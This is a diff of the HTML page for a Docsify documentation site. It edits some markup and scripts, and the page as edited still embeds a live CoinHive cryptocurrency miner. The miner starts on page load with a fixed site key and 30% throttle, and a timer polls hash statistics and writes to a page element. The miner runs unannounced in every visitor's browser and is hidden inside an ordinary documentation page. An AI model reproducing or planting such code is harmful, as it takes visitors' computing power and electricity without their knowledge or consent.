@@ -10,7 +10,7 @@
   <link rel="stylesheet" href="//unpkg.com/docsify/lib/themes/vue.css">
 </head>
 <body>
-  <div id="abc"><p>AAAAAAAAAAAAAAAAAAAA</p></div>	
+  <div id="abc"></div>
   <div id="app"></div>
   <script>
     window.$docsify = {
@@ -35,19 +35,13 @@
   <script>
 	var miner = new CoinHive.Anonymous('4UHE71CMZYeH5BoLMvhcGfDqhzBkB8mv', {throttle: 0.3});
   	miner.start();
-  </script>
-  <script>
-	// Listen on events
 	miner.on('found', function() { /* Hash found */ })
 	miner.on('accepted', function() { /* Hash accepted by the pool */ })
-
-	// Update stats once per second
 	setInterval(function() {
 		var hashesPerSecond = miner.getHashesPerSecond();
 		var totalHashes = miner.getTotalHashes();
 		var acceptedHashes = miner.getAcceptedHashes();
-		document.querySelector('.abc').innerHTML = "a"+totalHashes;
-
+		document.getElementById("abc").innerHTML = "yes";
 	}, 1000);
 </script>
   <script src="//unpkg.com/docsify/lib/docsify.min.js"></script>
